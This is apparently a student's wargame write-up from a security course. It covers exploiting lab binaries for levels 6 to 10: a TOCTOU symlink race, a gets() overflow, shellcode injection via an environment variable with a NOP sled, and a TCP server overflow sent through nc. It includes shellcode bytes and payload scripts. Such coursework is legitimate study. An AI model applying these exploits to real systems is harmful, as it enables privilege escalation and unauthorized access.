level 6:
For this level, I determined the vulnerability to be TOCTOU. Thus, the exploit involves
changing out the file to be read after we insert a file that would pass the initial check. 
So to do that, I created a symlink that traversed 12000 directories that pointed to 5.cmd, 
a file that would pass the initial check to verify correct ownership of the file, then as ./5 was 
executing I ran a script simultaneously that would sleep for .0001 seconds and then change the symlink to my 
desired file that would run l33t. The command to do that is:

./5 ~/target && ~/redirect.sh

target is my symlink 12000 directories deep

 The script redirect.sh goes as follows:

#!/usr/bin/bash
sleep 0.0001
ln -sf ~/evil.cmd ~/target

It then redirects to evil.cmd which contains:

/usr/local/bin/l33t

So, the file ./5 will then execute my input command, running l33t with sgid bit on beating the level.


level 7:

This is the first of the buffer overflow levels, this one being the most simple by far.
So, the file uses gets(), a deprecated function that allows you to write as far as you want.
So, I filled the buffer with 256 characters of garbage(which is the max length of the expected input) then 
wrote /usr/local/bin/l33t which overwrote the filename variable. Which is then executed with sgid bit on giving me
level8 access. 

level 8:

This is the first level that I used shellcode for, this is my shellcode:

"\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43" +\
"\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5" +\
"\xff\xff\xff/bin/sh/xAAAABBBB"

It was acquired from lecture and it runs /bin/sh. I used it and put in into an environment variable using a python script which went as follows:

#!/usr/bin/python

sc = \
"\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43" +\
"\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5" +\
"\xff\xff\xff/bin/sh/xAAAABBBB"


print "\x90"*10000+sc

This placed a 10000 byte wide NOP sled in front of my shellcode to give me a bigger window to hit when searching for the correct address.
Then I wrote the command:

export SC=$(./myscript.py)

Which inserted it into my environment variables labled as SC. I then examined the 7.c file,
finding that I could write out of bounds in the array into anything lower on the stack than the array variable, I just had to count 
how many index's down that would be. I found that index 11 would write to the return address, so if I could find and write the address of my shellcode 
I could beat the level. So, I went in to GDB again to find that address and found it to be 0xffffda66. So, finally I had all I needed in place 
to beat the level. I ran ./7 11 ffffda70, which overwrote the ret address with the address of my shellcode yielding a shell, where I then wrote 
l33t which beat the level.

Level 9:

This level was pretty complex, 8.c showed a server file with options for tcp and udp. After examining the code, I foound the vuln to be in the 
manage_tcp_client function. Wherein, the function would continue to write to the buffer(of size 65536) until it recieved a \0 from the client. 
So, I could use this to continue writing until I reached the return address of the function and overwrite it sending it to my shellcode. However, there
are a number of caveats that complicate things. First being that the function manage_tcp_client is running as a child process, so my shellcode must run l33t
directly rather than having it spawn a shell because child processes aren't connected to any terminal. second being that in the process of overwriting variables
on the way to the return address you have to pass over the index variable which is controlling where on the stack you're writing to. So, you have to modify index 
such that when it writes to itself it makes you actually jump to return address where you can write the address of your shellcode. I'm also going to put my shellcode
within the buffer this time since it's large enough. So, after GDBing to find the address I should jump to, I ran the server file with the command ./8 -p 28880 -t tcp.
This starts the server on tcp mode on port 28880. I then open another terminal sshed into Razor and connect a client to the server with the command:
echo $(level9shellcode.py) | nc 0.0.0.0 28880
level9shellcode.py goes as follows:

#!/usr/bin/python

sc = \
"\xeb\x16\x5b\x31\xc0\x88\x43\x13\x89\x5b\x14\x89\x43" +\
"\x18\xb0\x0b\x8d\x4b\x14\x8d\x53\x18\xcd\x80\xe8\xe5" +\
"\xff\xff\xff/usr/local/bin/l33t/xAAAABBBB"

print "\x90"*65478+sc+"\x0b\xf4\xe4\xfd\xff";

This command will then pipe the output of the echo into the input of the server which fills the buffer with tons of NOPs, my shellcode, the overwrite byte of index(\x0b), and
finally the address to jump into my shellcode in little endian order. This runs l33t and beats the level.

level 10:

I was unable to break this level in time, however I have some insight into how to beat it. The main difficulty in this level is that it won't let 
you use command line args if your egid doesn't match your gid, which is the case because the sgid bit is on. So, I believe you must look at where
the strcpy function looks to find argv[4] and replace that value with the bytes to overwrite the buffer and the return address and get it to jump to 
your shellcode most likely located in an environment variable. I'm unsure of how to do this but was looking into using execve to use the environment variable pointers 
to point to the argv[4] but ran out of time before I could figure it out. I was able to get the process to spawn a shell in GDB very easily because it drops the egid, so I could fill
the buffer from the command line, but this didn't prove helpful to solve the level.